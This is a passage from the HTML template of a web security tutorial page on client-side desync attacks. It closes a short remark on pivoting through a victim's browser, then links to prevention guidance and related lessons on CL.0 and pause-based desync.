            As all of the requests originate from the victim's browser, this potentially enables you to pivot attacks against any website that they have access to. This includes sites located on trusted intranets or that are hidden behind IP-based restrictions. Some browsers are working on mitigations for these types of attack, but these are likely to only have partial coverage.
        </p><h2 id="how-to-prevent-client-side-desync-vulnerabilities">How to prevent client-side desync vulnerabilities</h2><p>
            For some high-level measures you can take to prevent client-side desync vulnerabilities, and other forms of desync attack, see <a href="/web-security/request-smuggling#how-to-prevent-http-request-smuggling-vulnerabilities">How to prevent HTTP request smuggling vulnerabilities</a>.
        </p><div class="component-labinstructions">
            <h4>What next?</h4>
            <p>
                You've learned about <a href="/web-security/request-smuggling/browser/cl-0">CL.0</a> and <a href="/web-security/request-smuggling/browser/client-side-desync">CSD</a> attacks, but there's another potential desync vector that can enable both server-side and client-side exploits on websites that may initially appear secure. To learn more, check out <a href="/web-security/request-smuggling/browser/pause-based-desync">Pause-based desync vulnerabilities</a> <span class="label-light-green-small">LABS</span>
            </p>
        </div>
        
        @endverbatim@include('partials.widget', ['id' => 'academy-registration-footer'])@verbatim
    
    </div>


    
    

            
        </main>
    </div>
</div>
@endverbatim
@endsection
